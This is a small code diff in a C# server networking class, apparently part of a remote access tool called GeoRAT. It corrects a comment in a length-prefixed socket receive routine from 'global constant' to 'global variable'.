@@ -65,7 +65,7 @@ namespace GeoRAT.Server.Net
                 }
                 DataSocket.Receive(PrefixBuffer, total, left, SocketFlags.None); //Get all bytes now 
                 var len = BitConverter.ToInt32(PrefixBuffer, 0); //Deserialize received bytes back to INT and get length of packet
-                MessageLength = len; //Assign length to global constant 
+                MessageLength = len; //Assign length to global variable
                 ReceiveMessage(MessageLength); //Begin reading incoming packets based on length now 
                 
             }
